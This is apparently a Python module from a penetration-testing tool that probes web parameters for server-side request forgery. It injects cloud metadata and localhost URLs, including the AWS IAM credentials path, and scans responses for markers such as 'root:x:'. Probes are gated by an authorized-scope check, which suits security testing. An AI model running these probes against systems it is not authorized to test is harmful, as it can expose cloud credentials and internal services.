"""SSRF deep probing helpers with safe defaults."""

from __future__ import annotations

from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse

import httpx

from argusai.core.infra.command import in_scope, normalize_scope
from argusai.core.security.evidence import curl_repro, evidence_record, response_excerpt
from argusai.core.payloads import PayloadLibrary


SSRF_PARAM_HINTS = {"url", "uri", "target", "next", "redirect", "callback", "webhook", "image", "avatar", "proxy", "dest"}


def ssrf_metadata_template(provider: str = "aws") -> dict[str, Any]:
    templates = {
        "aws": ["http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
        "gcp": ["http://metadata.google.internal/computeMetadata/v1/"],
        "azure": ["http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
        "local": ["http://127.0.0.1:80", "http://localhost:80", "http://[::1]/"],
    }
    return {"ok": True, "provider": provider, "payloads": templates.get(provider, templates["aws"])}


def inject_url_param(url: str, param: str, value: str) -> str:
    u = urlparse(url)
    q = parse_qsl(u.query, keep_blank_values=True)
    if any(k == param for k, _ in q):
        q = [(k, value if k == param else v) for k, v in q]
    else:
        q.append((param, value))
    return u._replace(query=urlencode(q)).geturl()


async def ssrf_probe_url_param(url: str, param: str = "", payload: str = "http://127.0.0.1", *, scope: str | list[str] | None = None) -> dict[str, Any]:
    if not in_scope(url, normalize_scope(scope)):
        return {"ok": False, "error": f"target out of authorized scope: {url}", "url": url}
    if not param:
        keys = [k for k, _ in parse_qsl(urlparse(url).query)]
        param = next((k for k in keys if k.lower() in SSRF_PARAM_HINTS), keys[0] if keys else "url")
    test_url = inject_url_param(url, param, payload)
    try:
        async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
            base = await client.get(url)
            r = await client.get(test_url)
    except Exception as e:
        return {"ok": False, "error": str(e), "url": test_url}
    markers = ["ami-id", "instance-id", "localhost", "root:x:", "metadata", "EC2", "computeMetadata"]
    body = r.text[:5000]
    suspected = any(m.lower() in body.lower() for m in markers) or abs(len(r.text) - len(base.text)) > max(200, len(base.text) * 0.25)
    return {
        "ok": True,
        "suspected": suspected,
        "url": test_url,
        "param": param,
        "payload": payload,
        "status_code": r.status_code,
        "evidence": evidence_record(
            kind="ssrf",
            surface=f"url_param:{param}",
            payload=payload,
            url=test_url,
            status_code=r.status_code,
            response_excerpt=response_excerpt(r.text),
            confidence="suspected" if suspected else "negative",
            test_case=curl_repro(test_url),
        ),
    }


async def ssrf_redirect_chain_test(url: str, redirect_url: str, *, scope: str | list[str] | None = None) -> dict[str, Any]:
    if not in_scope(url, normalize_scope(scope)):
        return {"ok": False, "error": f"target out of authorized scope: {url}", "url": url}
    return {
        "ok": True,
        "test_url": url,
        "redirect_target": redirect_url,
        "notes": "Use an in-scope controlled redirect endpoint. Then inject that endpoint into SSRF parameters and correlate whether the server follows redirects.",
    }


def ssrf_payload_inventory() -> dict[str, Any]:
    return {"ok": True, "payloads": [p.value for p in PayloadLibrary.SSRF], "hints": sorted(SSRF_PARAM_HINTS)}

